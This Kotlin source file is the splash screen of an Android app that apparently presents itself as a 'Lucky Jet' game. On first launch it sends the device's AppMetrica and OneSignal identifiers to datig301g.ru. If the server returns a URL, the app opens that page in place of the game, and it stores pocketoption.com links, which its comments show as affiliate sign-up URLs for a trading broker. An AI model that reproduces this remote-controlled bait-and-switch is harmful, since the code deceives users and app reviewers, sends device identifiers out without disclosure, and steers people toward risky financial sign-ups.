package com.gamelacky.luckyjet.lucky.app


import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import com.android.volley.Response
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.gamelacky.luckyjet.lucky.app.dodger.MainActivity
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.onesignal.OneSignal
import com.yandex.metrica.AppMetricaDeviceIDListener
import com.yandex.metrica.YandexMetrica
import moxy.MvpAppCompatActivity
import java.util.*

class PreviewScreenActivity : MvpAppCompatActivity(R.layout.splash) {
    companion object {
        const val REQUEST_CODE_KEY = "REQUEST_CODE_KEY"
        const val IS_FIRST_RUN_KEY = "IS_FIRST_RUN_KEY"
        const val PREFERENCE_KEY = "PREFERENCE"
        const val URL_KEY = "url"
        const val FILTER_URL = "filter"

    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
//        presenter.showAuthScreen()
//        showAuthScreen()
        if (savedInstanceState == null) {
            YandexMetrica.reportAppOpen(this)
        }
//        YandexMetrica.reportEvent("Logoreg1")
//        YandexMetrica.reportEvent("Logoreg2")
//        YandexMetrica.reportEvent("Logoreg3")
//        YandexMetrica.reportEvent("Logoreg4")
//        YandexMetrica.reportEvent("Logoreg5")
//        YandexMetrica.reportEvent("Logoreg6")
//        YandexMetrica.reportEvent("Logoreg7")
//        YandexMetrica.reportEvent("Logoreg8")
//        YandexMetrica.reportEvent("Logoreg9")
//        YandexMetrica.reportEvent("Logoreg10")
//        YandexMetrica.reportEvent("Logoreg11")
//        YandexMetrica.reportEvent("Logoreg12")
//        YandexMetrica.reportEvent("Logoreg13")
//        YandexMetrica.reportEvent("Logoreg14")
//        YandexMetrica.reportEvent("Logoreg15")
//        YandexMetrica.reportEvent("Logoreg16")
//        YandexMetrica.reportEvent("Logoreg17")
//        YandexMetrica.reportEvent("Logoreg18")
//        YandexMetrica.reportEvent("Logoreg19")
//        YandexMetrica.reportEvent("Logoreg20")
//        val eventParameters = "{\"Logoreg\":\"Logoreg\"}"
////
//        YandexMetrica.reportEvent("Logoreg", eventParameters)

//        YandexMetrica.requestAppMetricaDeviceID(object : AppMetricaDeviceIDListener {
//            override fun onLoaded(p0: String?) {
//                if (p0 != null) {
        YandexMetrica.requestAppMetricaDeviceID(object : AppMetricaDeviceIDListener {
            override fun onLoaded(p0: String?) {
                if (p0 != null) {
                    val userId = OneSignal.getDeviceState()?.userId
                    if (userId != null) {

                        makeRequest(applicationContext, userId, p0)
                    } else {
                        makeRequest(applicationContext, null, p0)

                    }

                } else {
                    val userId = OneSignal.getDeviceState()?.userId
                    if (userId != null) {
                        makeRequest(applicationContext, userId, p0)
                    } else {
                        makeRequest(applicationContext, null, null)

                    }

                }
            }

            //
            override fun onError(p0: AppMetricaDeviceIDListener.Reason) {
                OneSignal.getDeviceState()?.userId?.let {
                    makeRequest(applicationContext, it, null)
                }
            }
//
        })

//                }

//            }

//            override fun onError(p0: AppMetricaDeviceIDListener.Reason) {
//
//            }

//        })

    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        YandexMetrica.reportAppOpen(this)
    }

    fun showAuthScreen() {
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        finish()
    }

    fun showPageByUrl(url: String) {
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(this, MainScreenActivity::class.java)
            intent.putExtra(URL_KEY, url)
            startActivity(intent)
            finish()
        }, 2000)
    }

    fun showError() {
        AlertDialog.Builder(this)
            .setIcon(R.drawable.error_icon)
            .setTitle("ERROR")
            .setMessage("Please, check your internet connection status and restart application")
            .setPositiveButton("OK", null)
            .show()
    }

    fun makeRequest(context: Context, deviceId: String?, metrica: String?) {
        if (checkForFirstRun(context)) {
            val queue = Volley.newRequestQueue(context)
            val url =
                "https://datig301g.ru/aka.php?id=a0fhpqsejfnxf5l194y3&appmetrica_device_id=$metrica&onesignal=$deviceId"
//        val url = BuildConfig.URL + "&site_id=" + referrer
            val jsonObjectRequest = object : JsonObjectRequest(
                Method.GET, url, null,
                Response.Listener { response ->

//                response.put(
//                    "url",
//                    "https://ru.investing.com/currencies/"
//                )
//                    response.put(
//                        "url",
//                        "https://pocketoption.com/register/?utm=parametr"
//                    )
//                    "url":"https:\/\/pocketoption.com\/register\/?utm_source=affiliate&a=j0mcTFy5ywbX9L&ac=ga&code=50START"
//                    ["https://pocketoption.com/register/?utm_source\u003daffiliate\u0026a\u003dj0mcTFy5ywbX9L\u0026ac\u003dga\u0026code\u003d50START"]
//                    response.remove("url")
                    if (response.has(URL_KEY) && response.getString(URL_KEY) != "null") {
//                    val urlResponse = response.getString(URL_KEY) + referrer
                        val urlResponse = response.getString(URL_KEY)
                        if (urlResponse.contains("pocketoption.com")) {
                            val gson = GsonBuilder().disableHtmlEscaping().create()
                            val s2 = gson.toJson(urlResponse.toString())
                            saveFilterUrl(context, s2)
                        }

//                    if (urlResponse.contains(response.getString("reg_url"))) {
//                        sendEvent(context)
//                    }
                        makeIsNotFirstLogin(context)
                        showPageByUrl(urlResponse)
                    } else {
//                        saveUrl(context, null)
                        makeIsNotFirstLogin(context)
                        showAuthScreen()
                    }
                },
                Response.ErrorListener { error ->
                    showError()
                    makeIsNotFirstLogin(context)
                    showAuthScreen()
                    error.printStackTrace()
                }
            ) {
                override fun getHeaders(): Map<String, String> {
                    val headers: MutableMap<String, String> = HashMap()
                    headers["Accept-Language"] = Locale.getDefault().country
                    return headers
                }
            }
            queue.add(jsonObjectRequest)
        } else {
            val url = getUrl(context)
            val filter = getFilterUrl(context)
            if (url.equals("")) {
                showAuthScreen()
            } else {
                if (filter?.contains("pocketoption.com") == true) {
                    val replaceFirst = filter.replace("\"", "").replaceFirst("\\", "")
//
                    showPageByUrl(replaceFirst.substring(0, replaceFirst.length - 1))
                } else {
                    url?.let { showPageByUrl(it) }
                }
            }
        }
    }


    private fun makeIsNotFirstLogin(context: Context) {
        context.getSharedPreferences(PREFERENCE_KEY, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(IS_FIRST_RUN_KEY, false)
            .apply()
    }

    private fun saveUrl(context: Context, url: String) {
        context.getSharedPreferences(PREFERENCE_KEY, Context.MODE_PRIVATE)
            .edit()
            .putString(URL_KEY, Gson().toJson(arrayListOf(url)))
            .apply()
    }

    private fun getUrl(context: Context): String? {
        return context.getSharedPreferences(PREFERENCE_KEY, Context.MODE_PRIVATE)
            .getString(URL_KEY, "")
    }

    private fun getFilterUrl(context: Context): String? {
        return context.getSharedPreferences(PREFERENCE_KEY, Context.MODE_PRIVATE)
            .getString(FILTER_URL, "")
    }

    private fun saveFilterUrl(context: Context, url: String) {
        context.getSharedPreferences(PREFERENCE_KEY, Context.MODE_PRIVATE)
            .edit()
            .putString(FILTER_URL, GsonBuilder().disableHtmlEscaping().create().toJson(url))
            .apply()
    }

    private fun checkForFirstRun(context: Context): Boolean {
        return context.getSharedPreferences(
            PREFERENCE_KEY,
            Context.MODE_PRIVATE
        ).getBoolean(IS_FIRST_RUN_KEY, true)
    }
}